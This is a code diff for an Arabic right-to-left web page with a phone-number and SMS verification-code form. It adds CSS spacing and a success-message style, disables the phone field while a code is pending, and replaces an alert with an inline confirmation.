@@ -15,6 +15,7 @@
       margin: 0;
       direction: rtl;
     }
+
     .container {
       background: white;
       border-radius: 12px;
@@ -24,18 +25,21 @@
       max-width: 420px;
       box-sizing: border-box;
     }
+
     h2 {
       text-align: center;
       margin-bottom: 25px;
       color: #333;
       font-weight: 700;
     }
+
     label {
       display: block;
       margin-bottom: 8px;
       font-weight: 600;
       color: #555;
     }
+
     input[type="tel"],
     input[type="text"] {
       width: 100%;
@@ -48,11 +52,13 @@
       font-family: inherit;
       box-sizing: border-box;
     }
+
     input[type="tel"]:focus,
     input[type="text"]:focus {
       border-color: #28a745;
       outline: none;
     }
+
     button {
       width: 100%;
       padding: 14px;
@@ -66,13 +72,16 @@
       transition: background-color 0.3s ease;
       margin-bottom: 15px;
     }
+
     button:hover:not(:disabled) {
       background-color: #218838;
     }
+
     button:disabled {
       background-color: #94d3a2;
       cursor: not-allowed;
     }
+
     #timer {
       text-align: center;
       font-weight: 600;
@@ -80,8 +89,16 @@
       margin-bottom: 20px;
       min-height: 24px;
     }
+
     #codeField {
       display: none;
+    }
+
+    .success-message {
+      color: #28a745;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 10px;
     }
   </style>
 </head>
@@ -99,7 +116,7 @@
 
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
-        <label for="code">أنتظر رسالــة sms... :</label>
+        <label for="code">جاري ارسال الكود SMS</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
         <button type="submit" id="sendCodeBtn">طلب الدخول</button>
       </div>
@@ -125,6 +142,7 @@
           clearInterval(countdownInterval);
           timerDisplay.style.display = 'none';
           sendPhoneBtn.disabled = false;
+          phoneInput.disabled = false;
         }
       }, 1000);
     }
@@ -159,8 +177,9 @@
 
         codeField.style.display = 'block';
         sendPhoneBtn.disabled = true;
+        phoneInput.disabled = true;
+        timerDisplay.textContent = "✅ تم إرسال الكود بنجاح، تحقق من الرسائل.";
         startTimer(480); // 8 دقائق
-        alert('تم إرسال رقم الهاتف بنجاح، سيتم طلب الدخول قريبًا.');
       })
       .catch(error => {
         console.error('فشل الإرسال:', error);
